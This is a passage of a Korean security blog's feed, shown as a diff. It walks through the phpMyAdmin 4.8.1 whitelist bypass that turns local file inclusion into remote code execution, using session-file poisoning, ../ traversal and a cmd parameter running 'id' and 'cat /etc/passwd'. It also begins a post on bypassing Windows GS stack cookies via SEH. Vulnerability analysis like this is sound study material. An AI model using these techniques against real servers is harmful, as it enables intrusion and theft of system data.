-   - PHPMyAdmin 4.8.1 index.php line 53 to 62 -
-  &lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// whitelist of /phpmyadmin/libraries/Core.php
-&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$goto_whitelist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'db_datadict.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'db_sql.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'db_events.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'db_export.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        
-    &lt;span class=&quot;s1&quot;&gt;'db_importdocsql.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'db_multi_table_query.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'db_structure.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'db_import.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'db_operations.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'db_search.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'db_routines.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'export.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'import.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'index.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'pdf_pages.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'pdf_schema.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_binlog.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_collations.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_databases.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_engines.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_export.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_import.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_privileges.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_sql.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_status.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_status_advisor.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_status_monitor.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_status_queries.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_status_variables.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'server_variables.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'sql.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_addfield.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_change.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_create.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_import.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_indexes.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_sql.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_export.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_operations.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_structure.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_relation.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_replace.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_row_action.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_select.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'tbl_zoom_select.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'transformation_overview.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'transformation_wrapper.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-    &lt;span class=&quot;s1&quot;&gt;'user_password.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;figure&gt;
-  &lt;figcaption&gt;&lt;center&gt;  
-   - PHPMyAdmin 4.8.1 whitelist of phpmyadmin/libraries/Core.php -
-  &lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// checkPageValidity of /phpmyadmin/libraries/Core.php
-&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;checkPageValidity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$whitelist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$whitelist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-       &lt;span class=&quot;nv&quot;&gt;$whitelist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$goto_whitelist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;is_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-       &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$whitelist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-       &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-   &lt;span class=&quot;nv&quot;&gt;$_page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mb_substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-       &lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-       &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-       &lt;span class=&quot;nb&quot;&gt;mb_strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-   &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$whitelist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-       &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-   &lt;span class=&quot;nv&quot;&gt;$_page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;urldecode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// url decoding 
-&lt;/span&gt;   &lt;span class=&quot;nv&quot;&gt;$_page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mb_substr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
-       &lt;span class=&quot;nv&quot;&gt;$_page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-       &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-       &lt;span class=&quot;nb&quot;&gt;mb_strpos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_page&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'?'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-   &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-   &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_page&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$whitelist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-       &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-   &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-   &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;figure&gt;
-  &lt;figcaption&gt;&lt;center&gt;  
-   - PHPMyAdmin 4.8.1 checkPageValidity of phpmyadmin/libraries/Core.php -
-  &lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;위 코드들이 해당 취약점에 발생되는 부분이며 간략하게 바로 드러나는 부분에 대해서는 주석처리로 설명하였습니다.&lt;br /&gt;&lt;br /&gt; 
-사용자가 입력한 값에 대한 검증에 미흡한 검증 절차가 있으며, checkPageValidity()에서 whitelist에 존재하는 값을 이용하여 db_sql.php?와 같이 bypass하기에 include() 함수를 이용하여 LFI가 가능한 것을 확인할 수 있습니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;취약점-공격-테스트&quot;&gt;취약점 공격 테스트&lt;/h5&gt;
-&lt;p&gt;먼저 다음과 같이 현재 php 관련 정보를 확인할 수 있는 것을 알 수 있습니다. 또한, 이번 취약점을 분석하는데 있어 중요하게 봐야할 부분 중 하나인 기본 세션 저장 경로(session_save_path)를 확인할 수 있습니다.&lt;br /&gt;&lt;br /&gt;
-현재 테스트 경로는 기본적으로 /var/lib/php/sessions라는 경로로 생성된 세션 파일이 저장되는 것으로 볼 수 있습니다.
-&lt;?php phpinfo(); ?&gt;&lt;/p&gt;
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x02_2.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;
-   - phpinfo() 결과 -
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;phpmyadmin으로 로그인 한 이후, SQL문을 실행할 수 있는 부분에서 다음과 같이 입력 한 후 실행하겠습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x02_3.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;
-   - SQL문 실행 시도 -
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;정상적으로 SQL문이 실행이 되고, 로그인 또는 페이지 접근 시 생성된 쿠키 정보 중 phpMyAdmin 세션 값을 확인할 수 있습니다.&lt;/p&gt;
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x02_4.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;
-   - SQL문 실행 결과 확인 및 쿠키, 세션정보 확인 -
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;위에서 봤던 것과 같이 해당 경로에 이전단계에서 확인한 세션값 앞에 ‘sess_‘이라는 문자열이 연결된 세션 파일이 생성되고, 존재하는 것을 확인할 수 있습니다.&lt;/p&gt;
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x02_5.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;
-   - 세션 파일 확인 -
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;해당 세션 파일의 내용을 확인해보면 앞서 실행하였던 SQL 쿼리문이 세션 파일 내용으로 포함된 것을 확인할 수 있습니다.&lt;/p&gt;
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x02_6.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;
-   - 세션 파일 내용 확인 -
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;다음 그림과 같이 화이트리스트에 존재하는 목록(db_sql.php) 이용한 index.php의 파라미터 target으로 사용하며, 추가적으로 파일다운로드 취약점을 이용한 공격 시 많이 알려지고 사용되는 상대경로 ex) ../../../ 를 이용하여 세션저장경로의 세션파일 연결하여 파라미터 값으로 요청한 결과입니다.&lt;br /&gt;&lt;br /&gt;
-본 그림에서 보이는 것과 같이 앞서 실행한 SQL문이 포함되어 phpinfo()가 정상적으로 동작된 결과가 LFI를 통해 확인할 수 있습니다.&lt;/p&gt;
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x02_7.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;
-   - LFI 시도 및 결과 -
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;지금까지 입력한 SQL문이 세션 파일 내 포함이 되며 정상적으로 실행된 결과를 LFI를 통해 확인할 수 있는 부분까지 진행하였습니다.&lt;br /&gt;&lt;br /&gt; 본격적인 RCE를 위해 다음과 같이 SQL문을 실행하여 세션파일 내 포함하도록 합니다. 본 SQL문에 포함되는 php구문에 시스템 명렁어를 실행하는 함수 중 system() 함수를 이용하였습니다.&lt;/p&gt;
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x02_8.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;
-   - 세션 파일 내용 확인 -
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;다음 그림으로 정상적으로 RCE가 가능한 것을 확인할 수 있습니다. 앞에서 수행했던 방식과 조금의 차이점은 파라미터를 포함하여 요청 하였습니다. cmd라는 파라미터로 입력한 시스템 명령어가 정상적으로 실행되는 것을 확인할 수 있습니다.&lt;/p&gt;
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x02_9.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;
-   - RCE 시도 및 결과 (id) -
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/web/0x02_10.png&quot; /&gt;
-  &lt;figcaption&gt;&lt;center&gt;
-   - RCE 시도 및 결과 (cat /etc/passwd) -
-&lt;/center&gt;&lt;/figcaption&gt;
-&lt;/figure&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;취약점 분석한 결과를 요약하면 다음과 같습니다.&lt;br /&gt;&lt;br /&gt;
-사용자가 실행한 SQL문이 세션 파일 내 포함됨&lt;br /&gt;
-Whitelist 값을 이용한 index.php의 target 파라미터로 요청 시 LFI 취약점 확인&lt;br /&gt;
-LFI를 이용한 원활한 RCE 사용 가능&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;패치 및 대응방안&lt;/strong&gt;
-&lt;br /&gt;
- https://www.phpmyadmin.net/files/4.8.2/ 를 통해 본 취약점과 타 취약점들에 대해서 패치가 된 버전인 4.8.2로 업데이트 된 것을 확인할 수 있습니다.&lt;br /&gt;&lt;br /&gt;
- ./phpmyadmin/libraries/classes/Core.php의 checkPageValidity()와 index.php의 checkPageValidity 호출 시 사용되는 파라미터 부분이 변경된 것을 확인하였습니다.
-&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;References&lt;/strong&gt;
-&lt;br /&gt;
-https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/&lt;br /&gt;
-https://www.vulnspy.com/phpmyadmin-4.8.1/&lt;br /&gt;
-https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e&lt;br /&gt;
-https://www.youtube.com/watch?v=bT-00ZUTq0o&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>hackyu</name></author><category term="Posts" /><summary type="html">LFI to RCE on PHPMyAdmin 4.8.0 ~ 4.8.1</summary></entry><entry><title type="html">windows-0x05</title><link href="/windows-0x05" rel="alternate" type="text/html" title="windows-0x05" /><published>2019-03-09T19:18:00+09:00</published><updated>2019-03-09T19:18:00+09:00</updated><id>/windows-0x05</id><content type="html" xml:base="/windows-0x05">&lt;h1 id=&quot;0x05-gs&quot;&gt;0x05 GS&lt;/h1&gt;
-
-&lt;h5 id=&quot;what-is-gs&quot;&gt;What is GS?&lt;/h5&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x05_1.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;GS는 STACK Cookie, Canary로도 불리는 메모리 보호 기법입니다.&lt;/p&gt;
-
-&lt;p&gt;이 GS는 BOF를 방어하기 위해 나온 기법 중 하나로, 함수가 시작될 때 STACK에 4 byte를 넣어놓고 함수가 종료될 때 이 4 byte가 변조되었는지 확인합니다.&lt;/p&gt;
-
-&lt;p&gt;만약 이 STACK Cookie가 처음과 다르다면, 프로그램은 바로 종료되어 버립니다.&lt;/p&gt;
-
-&lt;p&gt;아래 그림은 STACK Cookie가 적용되고 검사하는 과정을 나타냅니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x05_2.png&quot; alt=&quot;[그림 1-2]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;STACK BOF는 반드시 Buffer의 시작 주소부터 덮기 시작하여 RET를 변조하는 것이기 때문에 GS를 정확하게 똑같이 입력하지 않으면 BOF 공격을 성공할 수가 없죠.&lt;/p&gt;
-
-&lt;p&gt;STACK Cookie는 고정된 값으로 넣어줄 수도 있지만, 값을 랜덤하게 넣거나, 첫 바이트를 Null로 넣어주는 방식도 있습니다.&lt;/p&gt;
-
-&lt;p&gt;따라서, BOF 공격을 방어하기 위한 아주 효과적인 방법이라고 볼 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;그렇다면 이 메모리 기법은 어떻게 우회를 할 수 있을까요??&lt;/p&gt;
-
-&lt;p&gt;이 기법을 우회하기 위해서는 Window의 Error Handlering에 대한 지식이 필요합니다.&lt;/p&gt;
-
-&lt;h5 id=&quot;structured-error-handling&quot;&gt;Structured Error Handling&lt;/h5&gt;
-
-&lt;p&gt;구조적 예외처리(이하 SEH)는 윈도우 운영 체제 특성에 기반한 예외 처리 매커니즘입니다.&lt;/p&gt;
-
-&lt;p&gt;이 SEH는 Thread별로 독립적으로 설치되고 운영되는 특징이 있습니다.&lt;/p&gt;
-
-&lt;p&gt;쉽게 이야기를 해보자면..프로그램이 좀 더 안정적으로 돌아갈 수 있도록 에러가 발생했을 때, 처리를 담당하는 역할을 맡고 있다고 생각하시면 되겠습니다.&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x05_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;위 그림은 SEH의 구조와 동작을 표현한 내용입니다. 뭔가 좀 복잡해보이죠??&lt;/p&gt;
-
-&lt;p&gt;하나씩 설명해보도록 할게요.&lt;/p&gt;
-
-&lt;p&gt;프로그램이 실행되다가 에러가 발생하면 FS(=Segment Register)의 0번지의 값을 참조해서 TIB의 Exception_Register라는 값을 찾습니다.&lt;/p&gt;
-
-&lt;p&gt;여기에는 컴파일러가 미리 등록해놓은 에러 처리를 위한 Handler의 주소가 담겨있는데 이를 참조해서 Handler를 호출합니다.&lt;/p&gt;
-
-&lt;p&gt;만약 에러가 해결되지 않는다면 다음 Handler를 호출하는 방식으로 구현되어 있습니다.&lt;/p&gt;
-
-&lt;p&gt;만약 이 Handler가 발생한 에러를 위한 Handler가 맞다면 실행되고 아니면 *next SEH Record를 참조하여 다음 Handler를 실행하러 갑니다.&lt;/p&gt;
-
-&lt;p&gt;그런데 이 과정이 무한 반복이 되면 안되겠죠? 이 과정은 *next SEH Record의 값이 0xffffffff가 될 때까지만 진행이 되고&lt;/p&gt;
-
-&lt;p&gt;만약 0xffffffff가 된다면 Default Exception Handler를 호출하게 됩니다.&lt;/p&gt;
-
-&lt;p&gt;간단하쥬?&lt;/p&gt;
-
